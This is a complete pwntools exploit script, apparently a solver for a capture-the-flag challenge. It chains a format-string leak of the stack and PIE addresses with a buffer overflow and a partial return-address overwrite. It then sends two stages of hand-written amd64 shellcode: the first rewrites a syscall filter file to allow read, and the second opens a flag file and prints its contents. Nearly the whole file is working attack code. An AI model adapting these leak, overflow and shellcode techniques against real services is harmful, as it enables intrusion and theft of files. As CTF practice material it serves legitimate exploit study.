#!/usr/bin/env python3
import argparse
import os
import re
import time

from pwn import asm, context, p64, process, remote

context.arch = "amd64"
context.os = "linux"

PROMPT = b"Give us your move: "
ORIGINAL_FILTER = b"1\n2\n60\n231\n262\n"
PATCHED_FILTER = b"0\n1\n2\n60\n231\n262\n"
OFF_VULN_CALL = 0x13A7


def log(msg):
    print(msg, flush=True)


def reset_local_filter(path):
    with open(path, "wb") as fp:
        fp.write(ORIGINAL_FILTER)


def open_tube(args):
    if args.host:
        return remote(args.host, args.port)
    return process([args.binary], cwd=args.cwd)


def leak_and_reenter(io):
    io.recvuntil(PROMPT)
    payload = (b"%1$p.%15$p\n\x00").ljust(72, b"A") + b"\xa7"
    io.send(payload)
    out = io.recvuntil(PROMPT)
    vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
    if len(vals) < 2:
        raise RuntimeError(f"failed to parse leaks: {out!r}")
    buf = vals[0]
    pie = vals[1] - OFF_VULN_CALL
    return buf, pie, out


def build_patch_shellcode(filter_path):
    patch = PATCHED_FILTER.decode("latin1").replace("\n", "\\n")
    sc = asm(
        f"""
        lea rdi, [rip+path]
        push 0x201
        pop rsi
        push 2
        pop rax
        cdq
        syscall
        xchg eax, edi
        lea rsi, [rip+data]
        push {len(PATCHED_FILTER)}
        pop rdx
        push 1
        pop rax
        syscall
        xor edi, edi
        push 60
        pop rax
        syscall
    path:
        .asciz "{filter_path}"
    data:
        .ascii "{patch}"
    """
    )
    if len(sc) > 72:
        raise RuntimeError(f"patch shellcode too long: {len(sc)}")
    return sc


def build_read_shellcode(target_path, out_addr, read_size):
    sc = asm(
        f"""
        lea rdi, [rip+path]
        xor esi, esi
        push 2
        pop rax
        cdq
        syscall
        xchg eax, edi
        mov rsi, {out_addr}
        mov dx, {read_size}
        xor eax, eax
        syscall
        mov edx, eax
        push 1
        pop rdi
        push 1
        pop rax
        syscall
        xor edi, edi
        push 60
        pop rax
        syscall
    path:
        .asciz "{target_path}"
    """
    )
    if len(sc) > 72:
        raise RuntimeError(f"read shellcode too long: {len(sc)}")
    return sc


def run_stage(args, shellcode):
    io = open_tube(args)
    try:
        buf, pie, leaks = leak_and_reenter(io)
        payload = shellcode.ljust(72, b"\x90") + p64(buf)
        io.send(payload)
        data = io.recvall(timeout=args.timeout)
        return buf, pie, leaks + data
    finally:
        io.close()


def run_read_stage(args):
    io = open_tube(args)
    try:
        buf, pie, leaks = leak_and_reenter(io)
        shellcode = build_read_shellcode(args.flag_path, buf + 0x200, args.read_size)
        payload = shellcode.ljust(72, b"\x90") + p64(buf)
        io.send(payload)
        data = io.recvall(timeout=args.timeout)
        return buf, pie, leaks + data
    finally:
        io.close()


def extract_flag(blob):
    patterns = [
        rb"(RAM\{[^}\r\n\x00]{1,200}\})",
        rb"(flag\{[^}\r\n\x00]{1,200}\})",
        rb"([A-Za-z0-9_\-]+\{[^}\r\n\x00]{1,200}\})",
    ]
    for pat in patterns:
        match = re.search(pat, blob, re.IGNORECASE)
        if match:
            return match.group(1).decode("utf-8", "replace")
    return None


def resolve_defaults(args):
    if not args.host:
        args.binary = os.path.abspath(args.binary)
        args.cwd = os.path.abspath(args.cwd or os.path.dirname(args.binary))
    if args.flag_path is None:
        args.flag_path = "/flag.txt" if args.host else "./flag.txt"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    parser.add_argument("--binary", default="./challenge")
    parser.add_argument("--cwd")
    parser.add_argument("--filter-path", default="./filter.txt")
    parser.add_argument("--flag-path")
    parser.add_argument("--timeout", type=float, default=1.0)
    parser.add_argument("--read-size", type=int, default=0x100)
    parser.add_argument("--skip-patch", action="store_true")
    parser.add_argument("--only-patch", action="store_true")
    parser.add_argument("--no-reset", action="store_true")
    args = parser.parse_args()

    if bool(args.host) ^ bool(args.port):
        parser.error("pass both HOST and PORT, or neither")

    resolve_defaults(args)

    if not args.host and not args.no_reset:
        reset_local_filter(os.path.join(args.cwd, args.filter_path))

    if not args.skip_patch:
        log("[*] Stage 1: patch filter.txt")
        shellcode = build_patch_shellcode(args.filter_path)
        _, _, out = run_stage(args, shellcode)
        if args.only_patch:
            print(out.decode("latin1", "replace"))
            return 0
        time.sleep(0.2)

    log("[*] Stage 2: read target file")
    _, _, out = run_read_stage(args)
    flag = extract_flag(out)
    if flag:
        print(f"<FLAG>{flag}</FLAG>")
        return 0
    print(out.decode("latin1", "replace"))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
